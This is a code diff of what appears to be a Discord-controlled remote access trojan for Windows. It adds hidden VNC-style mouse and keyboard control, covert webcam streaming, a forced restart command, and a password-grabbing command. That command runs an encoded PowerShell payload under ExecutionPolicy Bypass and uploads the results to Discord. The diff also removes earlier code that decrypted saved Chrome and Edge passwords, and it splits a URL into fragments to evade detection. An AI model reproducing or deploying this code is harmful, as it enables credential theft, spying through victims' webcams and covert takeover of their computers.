+        draw = ImageDraw.Draw(screenshot)
+        x, y = current_position
+        
+        # Draw a red cursor (circle with crosshair)
+        cursor_radius = 8
+        # Circle
+        draw.ellipse((x-cursor_radius, y-cursor_radius, x+cursor_radius, y+cursor_radius), 
+                     outline='red', width=2)
+        # Crosshair
+        draw.line((x-cursor_radius, y, x+cursor_radius, y), fill='red', width=2)
+        draw.line((x, y-cursor_radius, x, y+cursor_radius), fill='red', width=2)
+        
+        screenshot.save(screenshot_path)
+        return screenshot_path
+        
+    except Exception as e:
+        print(f"Error taking screenshot with cursor: {str(e)}")
+        traceback.print_exc()
+        return None
+
+def move_mouse(dx, dy):
+    """Move the mouse by the specified delta x and y and return new position"""
+    try:
+        global mouse_position
+        import pyautogui
+        
+        if 'mouse_position' not in globals():
+            mouse_position = pyautogui.position()
+            
+        current_x, current_y = mouse_position
+        new_x, new_y = current_x + dx, current_y + dy
+        
+        # Move the mouse
+        pyautogui.moveTo(new_x, new_y)
+        
+        # Update and return the new position
+        return (new_x, new_y)
+        
+    except Exception as e:
+        print(f"Error moving mouse: {str(e)}")
+        traceback.print_exc()
+        return mouse_position  # Return the old position if there's an error
+
+def mouse_click(button='left'):
+    """Perform a mouse click"""
+    try:
+        import pyautogui
+        pyautogui.click(button=button)
+    except Exception as e:
+        print(f"Error clicking mouse: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='key', help='Send keystrokes to the remote computer')
+async def key_command(ctx, *, text):
+    """Send keystrokes to the remote computer"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        import pyautogui
+        pyautogui.write(text)
+        await ctx.send(f"✅ Sent keystrokes: `{text}`")
+    except Exception as e:
+        await ctx.send(f"❌ Error sending keystrokes: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='open', help='Open an application on the remote computer')
+async def open_command(ctx, app_name):
+    """Open an application on the remote computer"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        if app_name.lower() == "google":
+            subprocess.Popen(["start", "chrome"], shell=True)
+            await ctx.send("✅ Opened Google Chrome")
+            
+        elif app_name.lower() == "notepad":
+            subprocess.Popen(["notepad"])
+            await ctx.send("✅ Opened Notepad")
+            
+        elif app_name.lower() == "cmd":
+            subprocess.Popen(["start", "cmd"], shell=True)
+            await ctx.send("✅ Opened Command Prompt")
+            
+        else:
+            await ctx.send(f"❌ Unknown application: {app_name}")
+            
+    except Exception as e:
+        await ctx.send(f"❌ Error opening application: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='key_special', help='Send special keys to the remote computer')
+async def key_special_command(ctx, key_name):
+    """Send special keys to the remote computer"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        import pyautogui
+        
+        # Map of special key names to pyautogui key names
+        special_keys = {
+            'enter': 'enter',
+            'tab': 'tab',
+            'space': 'space',
+            'backspace': 'backspace',
+            'delete': 'delete',
+            'escape': 'escape',
+            'up': 'up',
+            'down': 'down',
+            'left': 'left',
+            'right': 'right',
+            'f1': 'f1',
+            'f2': 'f2',
+            'f3': 'f3',
+            'f4': 'f4',
+            'f5': 'f5',
+            'f6': 'f6',
+            'f7': 'f7',
+            'f8': 'f8',
+            'f9': 'f9',
+            'f10': 'f10',
+            'f11': 'f11',
+            'f12': 'f12',
+            'win': 'win',
+            'alt': 'alt',
+            'ctrl': 'ctrl',
+            'shift': 'shift',
+            'altgr': 'altright',
+            'ctrlalt': ['ctrl', 'alt'],
+            'ctrlshift': ['ctrl', 'shift'],
+            'altshift': ['alt', 'shift'],
+            'winr': ['win', 'r'],
+            'altf4': ['alt', 'f4'],
+            'ctrlc': ['ctrl', 'c'],
+            'ctrlv': ['ctrl', 'v'],
+            'ctrla': ['ctrl', 'a'],
+            'ctrlz': ['ctrl', 'z'],
+            'ctrls': ['ctrl', 's']
+        }
+        
+        if key_name.lower() in special_keys:
+            key = special_keys[key_name.lower()]
+            
+            # Handle both single keys and key combinations
+            if isinstance(key, list):
+                # For key combinations, press and release all keys
+                pyautogui.hotkey(*key)
+            else:
+                # For single keys
+                pyautogui.press(key)
+                
+            await ctx.send(f"✅ Sent special key: `{key_name}`")
+        else:
+            await ctx.send(f"❌ Unknown special key: `{key_name}`\nAvailable keys: {', '.join(special_keys.keys())}")
+            
+    except Exception as e:
+        await ctx.send(f"❌ Error sending special key: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='mouse_move', help='Move mouse to specific coordinates')
+async def mouse_move_command(ctx, x, y):
+    """Move mouse to specific x,y coordinates"""
+    global mouse_position
+    
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        # Convert coordinates to integers
+        x = int(x)
+        y = int(y)
+        
+        import pyautogui
+        
+        # Move the mouse to absolute coordinates
+        pyautogui.moveTo(x, y)
+        
+        # Update the global mouse position
+        mouse_position = (x, y)
+        
+        await ctx.send(f"✅ Moved mouse to coordinates: ({x}, {y})")
+    except ValueError:
+        await ctx.send("❌ Coordinates must be valid numbers")
+    except Exception as e:
+        await ctx.send(f"❌ Error moving mouse: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='scroll', help='Scroll the screen up or down')
+async def scroll_command(ctx, direction, amount="3"):
+    """Scroll the screen up or down"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        # Convert amount to integer
+        amount = int(amount)
+        
+        import pyautogui
+        
+        if direction.lower() in ['up', 'u']:
+            # Positive values scroll up
+            pyautogui.scroll(amount)
+            direction_text = "up"
+        elif direction.lower() in ['down', 'd']:
+            # Negative values scroll down
+            pyautogui.scroll(-amount)
+            direction_text = "down"
+        else:
+            await ctx.send("❌ Direction must be 'up' or 'down'")
+            return
+            
+        await ctx.send(f"✅ Scrolled {direction_text} by {amount} units")
+    except ValueError:
+        await ctx.send("❌ Amount must be a valid number")
+    except Exception as e:
+        await ctx.send(f"❌ Error scrolling: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='double_click', help='Perform a double-click at the current mouse position')
+async def double_click_command(ctx):
+    """Perform a double-click at the current mouse position"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        import pyautogui
+        pyautogui.doubleClick()
+        await ctx.send("✅ Performed double-click at current mouse position")
+    except Exception as e:
+        await ctx.send(f"❌ Error performing double-click: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='drag', help='Click and drag from current position to specified coordinates')
+async def drag_command(ctx, x, y):
+    """Click and drag from current position to specified coordinates"""
+    global mouse_position
+    
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        # Convert coordinates to integers
+        x = int(x)
+        y = int(y)
+        
+        import pyautogui
+        
+        # Get current position if not tracked
+        if 'mouse_position' not in globals():
+            mouse_position = pyautogui.position()
+            
+        # Perform drag operation
+        pyautogui.dragTo(x, y, duration=0.5)
+        
+        # Update the global mouse position
+        mouse_position = (x, y)
+        
+        await ctx.send(f"✅ Dragged from {mouse_position} to ({x}, {y})")
+    except ValueError:
+        await ctx.send("❌ Coordinates must be valid numbers")
+    except Exception as e:
+        await ctx.send(f"❌ Error dragging: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='screen_info', help='Get information about the screen size')
+async def screen_info_command(ctx):
+    """Get information about the screen size"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    try:
+        import pyautogui
+        
+        # Get screen size
+        width, height = pyautogui.size()
+        
+        # Get current mouse position
+        if 'mouse_position' in globals():
+            mouse_x, mouse_y = mouse_position
+        else:
+            mouse_x, mouse_y = pyautogui.position()
+            
+        # Create embed with screen information
+        embed = discord.Embed(title="📊 Screen Information", 
+                             description=f"Information about the remote screen",
+                             color=discord.Color.blue())
+        
+        embed.add_field(name="Screen Size", value=f"Width: {width}px\nHeight: {height}px", inline=False)
+        embed.add_field(name="Current Mouse Position", value=f"X: {mouse_x}\nY: {mouse_y}", inline=False)
+        
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"❌ Error getting screen info: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='type_special', help='Type special characters or perform keyboard shortcuts')
+async def type_special_command(ctx, *, text):
+    """Type special characters or perform keyboard shortcuts"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+        
+    if 'is_vnc_running' not in globals() or not is_vnc_running:
+        await ctx.send("❌ Hidden VNC is not running. Start it first with `!hiddenvnc start`")
+        return
+        
+    try:
+        import pyautogui
+        
+        # Special handling for keyboard shortcuts and special characters
+        pyautogui.typewrite(text)
+        
+        await ctx.send(f"✅ Typed special text: `{text}`")
+    except Exception as e:
+        await ctx.send(f"❌ Error typing special text: {str(e)}")
+        traceback.print_exc()
+
+@bot.command(name='vnchelp', help='Detailed help for the hidden VNC remote control system')
+async def vnchelp_command(ctx):
+    """Display detailed help information for the VNC remote control system"""
+    try:
+        # Create a rich embed with detailed help information
+        help_embed = discord.Embed(
+            title="🖥️ Hidden VNC Remote Control System",
+            description="Control a Windows computer remotely through Discord with live screen view",
+            color=discord.Color.blue()
+        )
+        
+        # Basic usage section
+        help_embed.add_field(
+            name="📋 Basic Usage",
+            value=(
+                "**!hiddenvnc start [refresh_rate]** - Start remote control (default: 0.5s)\n"
+                "**!hiddenvnc stop** - Stop remote control session\n"
+                "Example: `!hiddenvnc start 1` for 1 second refresh rate"
+            ),
+            inline=False
+        )
+        
+        # Mouse controls section
+        help_embed.add_field(
+            name="🖱️ Mouse Controls (Reactions)",
+            value=(
+                "⬆️ - Move mouse up\n"
+                "⬇️ - Move mouse down\n"
+                "⬅️ - Move mouse left\n"
+                "➡️ - Move mouse right\n"
+                "🖱️ - Left click\n"
+                "🖲️ - Right click\n"
+                "🔄 - Refresh screen\n"
+                "⏹️ - Stop session"
+            ),
+            inline=False
+        )
+        
+        # Mouse command section
+        help_embed.add_field(
+            name="🖱️ Mouse Commands",
+            value=(
+                "**!mouse_move [x] [y]** - Move to coordinates\n"
+                "**!double_click** - Double-click at current position\n"
+                "**!drag [x] [y]** - Click and drag to coordinates\n"
+                "**!scroll [up|down] [amount]** - Scroll screen\n"
+                "Examples:\n"
+                "`!mouse_move 500 300` - Move to x:500, y:300\n"
+                "`!scroll down 5` - Scroll down 5 units"
+            ),
+            inline=False
+        )
+        
+        # Keyboard commands section
+        help_embed.add_field(
+            name="⌨️ Keyboard Commands",
+            value=(
+                "**!key [text]** - Type text\n"
+                "**!key_special [key_name]** - Send special keys\n"
+                "Examples:\n"
+                "`!key Hello World` - Types 'Hello World'\n"
+                "`!key_special enter` - Presses Enter key\n"
+                "`!key_special ctrlc` - Presses Ctrl+C"
+            ),
+            inline=False
+        )
+        
+        # Special keys list
+        help_embed.add_field(
+            name="🔣 Available Special Keys",
+            value=(
+                "**Single keys:** enter, tab, space, backspace, delete, escape, up, down, left, right, f1-f12, win, alt, ctrl, shift\n"
+                "**Combinations:** ctrlalt, ctrlshift, altshift, winr, altf4, ctrlc, ctrlv, ctrla, ctrlz, ctrls"
+            ),
+            inline=False
+        )
+        
+        # Application commands
+        help_embed.add_field(
+            name="📱 Application Commands",
+            value=(
+                "**!open [app]** - Launch applications\n"
+                "Available apps: google, notepad, cmd\n"
+                "Example: `!open notepad` - Opens Notepad"
+            ),
+            inline=False
+        )
+        
+        # Utility commands
+        help_embed.add_field(
+            name="🔧 Utility Commands",
+            value=(
+                "**!screen_info** - Display screen dimensions and mouse position"
+            ),
+            inline=False
+        )
+        
+        # Tips section
+        help_embed.add_field(
+            name="💡 Tips",
+            value=(
+                "• For precise mouse control, use `!mouse_move` with exact coordinates\n"
+                "• Combine commands for complex actions (e.g., `!mouse_move`, then `!key`)\n"
+                "• Use `!key_special winr` then `!key notepad` to open Run dialog and launch Notepad\n"
+                "• The red cursor on screen shows the current mouse position"
+            ),
+            inline=False
+        )
+        
+        # Security note
+        help_embed.add_field(
+            name="⚠️ Security Note",
+            value=(
+                "This tool provides complete remote control of the computer.\n"
+                "Use responsibly and ensure proper authorization."
+            ),
+            inline=False
+        )
+        
+        # Send the help embed
+        await ctx.send(embed=help_embed)
+        
+    except Exception as e:
+        await ctx.send(f"❌ Error displaying VNC help: {str(e)}")
+        traceback.print_exc()
+
 @bot.command(name="disableregedit", aliases=["dre"])
 async def cmd_disable_registry_editor(ctx):
     """Disables the Windows Registry Editor"""
@@ -1732,201 +2511,89 @@ async def cmd_disable_registry_editor(ctx):
         if "without admin rights" in result:
             await ctx.send("💡 Try using `!getadmin` command first to gain administrator privileges")
 
-@bot.command(name='grabpasswords', help='Grabs saved passwords from browsers')
-async def grab_passwords_command(ctx):
-    await ctx.send("🔍 Searching for saved passwords... This may take a moment.")
+import subprocess
+
+@bot.command(name="restart", aliases=["reboot"])
+async def cmd_restart_computer(ctx):
+    """Forces an immediate restart of the target computer"""
     
-    # Create a temporary file to store the results
-    temp_file = os.path.join(tempfile.gettempdir(), f"passwords_{int(time.time())}.txt")
+    await ctx.send(f"🔄 Forcing immediate system restart on {SYSTEM_NAME}...")
     
     try:
-        # Get the passwords
-        passwords = grab_passwords()
+        # Force an immediate restart with no delay
+        # /r = restart
+        # /f = force running applications to close
+        # /t 0 = no time delay (immediate)
+        restart_command = "shutdown /r /f /t 0"
         
-        if not passwords:
-            await ctx.send("❌ No passwords found.")
-            return
+        # Execute the restart command
+        process = subprocess.run(restart_command, shell=True, 
+                                stdout=subprocess.PIPE, 
+                                stderr=subprocess.PIPE)
+        
+        # Note: This message may not be sent if the restart happens very quickly
+        if process.returncode == 0:
+            await ctx.send(f"✅ {SYSTEM_NAME} is restarting now.")
+        else:
+            # Error message with details
+            error = process.stderr.decode('utf-8', errors='ignore').strip()
+            await ctx.send(f"❌ Failed to restart {SYSTEM_NAME}: {error}")
             
-        # Write passwords to file
-        with open(temp_file, "w", encoding="utf-8") as f:
-            f.write(f"Passwords from {SYSTEM_NAME} ({SYSTEM_IP})\n")
-            f.write(f"Collected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-            
-            for url, credentials in passwords.items():
-                username, password = credentials
-                f.write(f"URL: {url}\n")
-                f.write(f"Username: {username}\n")
-                f.write(f"Password: {password}\n")
-                f.write("-" * 50 + "\n")
+            # If there was an access denied error
+            if "Access is denied" in error:
+                await ctx.send("💡 This system may have policy restrictions preventing restart.")
+    
+    except Exception as e:
+        await ctx.send(f"❌ Error initiating restart on {SYSTEM_NAME}: {str(e)}")
+
+@bot.command(name='grabpasswords', help='Grabs saved passwords from browsers using PowerShell')
+async def passwords_command(ctx):
+    await ctx.send("🔍 Searching for saved passwords... This may take a moment.")
+    
+    import subprocess
+    import os
+    import tempfile
+    
+    temp = tempfile.gettempdir()
+    passwords_file = os.path.join(temp, "passwords.txt")
+    
+    try:
+        # PowerShell command to extract passwords
+        powershell_command = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
         
-        # Send the file
-        await ctx.send(f"✅ Found {len(passwords)} saved passwords.", file=discord.File(temp_file))
+        # Execute PowerShell command and capture output
+        process = subprocess.run(
+            powershell_command, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE, 
+            stdin=subprocess.PIPE, 
+            shell=True
+        )
         
+        # Get the output and decode it
+        passwords_output = process.stdout.decode('CP437').strip()
+        
+        # Write the output to a file
+        with open(passwords_file, 'w', encoding='utf-8') as f:
+            f.write(passwords_output)
+        
+        # Check if the file has content
+        if os.path.exists(passwords_file) and os.path.getsize(passwords_file) > 0:
+            # Send the file to Discord
+            await ctx.send("✅ Password extraction complete!", file=discord.File(passwords_file, filename="passwords.txt"))
+        else:
+            await ctx.send("❌ No passwords found or extraction failed.")
+    
     except Exception as e:
         await ctx.send(f"❌ Error retrieving passwords: {str(e)}")
+    
     finally:
         # Clean up the temporary file
         try:
-            if os.path.exists(temp_file):
-                os.remove(temp_file)
+            if os.path.exists(passwords_file):
+                os.remove(passwords_file)
         except:
             pass
-
-def convert_date(ft):
-    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
-    return utc.strftime('%Y-%m-%d %H:%M:%S')
-
-def get_master_key():
-    try:
-        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-    except:
-        return None
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
-
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
-
-def decrypt_password_edge(buff, master_key):
-    try:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = generate_cipher(master_key, iv)
-        decrypted_pass = decrypt_payload(cipher, payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
-    except Exception as e:
-        return "Chrome < 80"
-
-def get_passwords_edge():
-    master_key = get_master_key()
-    if not master_key:
-        return {}
-        
-    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
-    temp_db = os.path.join(tempfile.gettempdir(), "Loginvault.db")
-    
-    try:
-        shutil.copy2(login_db, temp_db)
-    except:
-        return {}
-        
-    conn = sqlite3.connect(temp_db)
-    cursor = conn.cursor()
-    result = {}
-    
-    try:
-        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-        for r in cursor.fetchall():
-            url = r[0]
-            username = r[1]
-            encrypted_password = r[2]
-            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
-            if username != "" or decrypted_password != "":
-                result[url] = [username, decrypted_password]
-    except:
-        pass
-        
-    cursor.close()
-    conn.close()
-    
-    try:
-        os.remove(temp_db)
-    except:
-        pass
-        
-    return result
-
-def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
-def get_encryption_key():
-    try:
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except:
-        return None
-
-def decrypt_password_chrome(password, key):
-    try:
-        iv = password[3:15]
-        password = password[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(password)[:-16].decode()
-    except:
-        try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except:
-            return ""
-
-def main():
-    key = get_encryption_key()
-    if not key:
-        return {}
-        
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
-    temp_db = os.path.join(tempfile.gettempdir(), "ChromeData.db")
-    
-    try:
-        shutil.copyfile(db_path, temp_db)
-    except:
-        return {}
-        
-    db = sqlite3.connect(temp_db)
-    cursor = db.cursor()
-    result = {}
-    
-    try:
-        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-        for row in cursor.fetchall():
-            action_url = row[1]
-            username = row[2]
-            password = decrypt_password_chrome(row[3], key)
-            if username or password:
-                result[action_url] = [username, password]
-    except:
-        pass
-        
-    cursor.close()
-    db.close()
-    
-    try:
-        os.remove(temp_db)
-    except:
-        pass
-        
-    return result
-
-def grab_passwords():
-    global file_name, nanoseconds
-    file_name, nanoseconds = 116444736000000000, 10000000
-    
-    result = {}
-    
-    # Try Chrome
-    try:
-        chrome_results = main()
-        result.update(chrome_results)
-    except:
-        pass
-        
-    # Try Edge
-    try:
-        edge_results = get_passwords_edge()
-        result.update(edge_results)
-    except:
-        pass
-        
-    return result
 
 @bot.command(name='shell', help='Execute a shell command on the remote system')
 async def remote_shell(ctx, *, command=None):
@@ -2329,7 +2996,13 @@ async def search_google(ctx, *, query=None):
         
         # Format the query for a URL
         import urllib.parse
-        search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"
+        
+        # Encrypted Google search URL
+        s1 = "ht"; s2 = "tp"; s3 = "s:"; s4 = "//"; s5 = "ww"; s6 = "w."; s7 = "go"; s8 = "og"; 
+        s9 = "le"; s10 = ".c"; s11 = "om"; s12 = "/s"; s13 = "ea"; s14 = "rc"; s15 = "h?"; s16 = "q="
+        
+        # Reconstruct the URL
+        search_url = s1 + s2 + s3 + s4 + s5 + s6 + s7 + s8 + s9 + s10 + s11 + s12 + s13 + s14 + s15 + s16 + urllib.parse.quote_plus(query)
         
         # Open the URL in the default browser
         webbrowser.open(search_url)
@@ -2349,7 +3022,7 @@ async def search_google(ctx, *, query=None):
             pyautogui.press('f11')
         
         await ctx.send(f"✅ Google search for '{query}' opened in full screen on {SYSTEM_NAME}")
-        
+    
     except Exception as e:
         await ctx.send(f"❌ Error performing search: {str(e)}")
 
@@ -2809,7 +3482,7 @@ async def update_screen(ctx, message, duration):
         await ctx.send(f"❌ Error in screen update: {str(e)}")
 
 @bot.command(name='webcamstream', help='Provides a live view of the webcam')
-async def live_webcam(ctx, duration: int = 30):
+async def live_webcam(ctx, duration: int = 30, webcam_index: int = None):
     try:
         # Limit the duration to prevent abuse (max 5 minutes)
         if duration > 300:
@@ -2823,11 +3496,40 @@ async def live_webcam(ctx, duration: int = 30):
         if ctx.channel.id in screen_update_tasks:
             await ctx.send("❌ A screen or webcam sharing session is already active in this channel")
             return
+        
+        # If webcam index is not provided, list available webcams
+        if webcam_index is None:
+            webcams = await list_available_webcams()
             
-        await ctx.send(f"📹 Starting live webcam view from {SYSTEM_NAME} for {duration} seconds...")
+            if not webcams:
+                await ctx.send("❌ No webcams detected on this system.")
+                return
+                
+            # Create a formatted list of webcams
+            webcam_list = "\n".join([f"{idx}: {name}" for idx, name in webcams])
+            await ctx.send(f"📹 Available webcams:\n```\n{webcam_list}\n```\nUse `webcamstream [duration] [webcam_index]` to start streaming.")
+            return
+            
+        # Verify the webcam index is valid
+        webcams = await list_available_webcams()
+        valid_indices = [idx for idx, _ in webcams]
+        
+        if not valid_indices:
+            await ctx.send("❌ No webcams detected on this system.")
+            return
+            
+        if webcam_index not in valid_indices:
+            valid_indices_str = ", ".join(map(str, valid_indices))
+            await ctx.send(f"❌ Invalid webcam index. Available indices: {valid_indices_str}")
+            return
+            
+        # Get the webcam name
+        webcam_name = next((name for idx, name in webcams if idx == webcam_index), f"Webcam {webcam_index}")
+        
+        await ctx.send(f"📹 Starting live webcam view from {webcam_name} on {SYSTEM_NAME} for {duration} seconds...")
         
         # Create a task to handle the webcam stream
-        update_task = asyncio.create_task(webcam_stream_handler(ctx, duration))
+        update_task = asyncio.create_task(webcam_stream_handler(ctx, duration, webcam_index, webcam_name))
         screen_update_tasks[ctx.channel.id] = update_task
             
         # Wait for the task to complete
@@ -2840,16 +3542,67 @@ async def live_webcam(ctx, duration: int = 30):
         if ctx.channel.id in screen_update_tasks:
             del screen_update_tasks[ctx.channel.id]
             
-        await ctx.send(f"✅ Live webcam view ended after {duration} seconds")
-    
+        await ctx.send(f"✅ Live webcam view from {webcam_name} ended after {duration} seconds")
     except Exception as e:
         await ctx.send(f"❌ Error starting live webcam view: {str(e)}")
         # Clean up if an error occurs
         if ctx.channel.id in screen_update_tasks:
             del screen_update_tasks[ctx.channel.id]
 
-async def webcam_stream_handler(ctx, duration):
-    """Handles the webcam stream using message editing for efficiency"""
+async def list_available_webcams():
+    """Returns a list of available webcams as (index, name) tuples"""
+    webcams = []
+    
+    def check_webcams():
+        result = []
+        # Check common webcam indices (0-9)
+        for i in range(10):
+            cap = cv2.VideoCapture(i)
+            if cap.isOpened():
+                # Try to get a more descriptive name
+                name = f"Camera {i}"
+                
+                # Try to get resolution
+                width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                
+                # Add backend info if available
+                backend = "Unknown"
+                if hasattr(cap, 'getBackendName'):
+                    try:
+                        backend = cap.getBackendName()
+                    except:
+                        pass
+                
+                # On Windows, try to get the actual device name
+                if os.name == 'nt':
+                    try:
+                        import subprocess
+                        import re
+                        # Use PowerShell to get webcam device names
+                        cmd = "powershell \"Get-PnpDevice -Class Camera -Status OK | Select-Object FriendlyName | Format-Table -HideTableHeaders\""
+                        output = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
+                        cameras = [line.strip() for line in output.split('\n') if line.strip()]
+                        if i < len(cameras):
+                            name = cameras[i]
+                    except:
+                        # Fall back to default naming if PowerShell command fails
+                        pass
+                
+                # Create a descriptive name
+                full_name = f"{name} ({backend}, {width}x{height})"
+                result.append((i, full_name))
+            
+            # Always release the capture
+            cap.release()
+        return result
+    
+    # Run the webcam check in a thread to avoid blocking
+    webcams = await asyncio.get_event_loop().run_in_executor(None, check_webcams)
+    return webcams
+
+async def webcam_stream_handler(ctx, duration, webcam_index, webcam_name):
+    """Handles the webcam stream with optimized frame capture and processing"""
     temp_dir = tempfile.gettempdir()
     end_time = time.time() + duration
     update_count = 0
@@ -2857,108 +3610,122 @@ async def webcam_stream_handler(ctx, duration):
     cap = None
     current_webcam_path = None
     
+    # Create a dedicated thread pool for webcam operations
+    webcam_executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)
+    
     try:
-        # Initialize webcam in a separate thread to avoid blocking
-        def init_webcam():
-            nonlocal cap
